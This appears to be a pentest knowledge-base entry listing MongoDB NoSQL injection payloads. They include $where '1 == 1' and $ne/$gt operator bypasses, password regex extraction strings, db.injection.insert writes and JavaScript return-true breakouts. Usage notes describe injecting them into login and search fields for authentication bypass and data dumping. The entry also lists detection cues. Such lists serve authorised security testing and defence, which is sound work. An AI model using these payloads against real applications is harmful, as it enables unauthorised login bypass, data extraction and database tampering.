---
type: code
language: javascript
verified: true
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Database
tags:
  - mongodb
  - nosql-injection
  - payload
validated: true
---

# MongoDB-Injection-Payloads

## Code

```javascript
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';return 'a'=='a' && ''=='
";return(true);var xyz='a
0;return true
```

## Description

This code snippet contains a collection of common MongoDB NoSQL injection payloads designed to exploit vulnerabilities in applications that construct queries dynamically from user input. These payloads target operators like $where for JavaScript evaluation, $ne for negation, $or for logical bypass, and others to alter query behavior, bypass authentication, or execute arbitrary actions like data insertion or commenting for blind confirmation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | These are static payload strings; substitute directly into HTTP parameters or queries as needed. No runtime variables. | N/A |

## Usage

Inject these payloads into vulnerable form fields (e.g., username or search queries) using tools like curl or Burp Suite. Start with simple ones like '$where: "1 == 1"' for authentication bypass, then escalate to data-dumping payloads like mapReduce emits. Use in ethical testing only, with permission, to verify MongoDB query sanitization.

## Detection

- Web application logs showing malformed queries with $ operators or JavaScript in inputs.
- Database logs (MongoDB audit) for unexpected $where executions or insertions like db.injection.insert.
- WAF alerts on payloads containing $, {, or JavaScript keywords like 'return' or 'emit'.
- Anomalous response times or error patterns from $comment or blind injections.

## Related

- [[procedures/Test-and-Exploit-MongoDB-NoSQL-Injection]]
- [[commands/curl-mongodb-injection-test]]
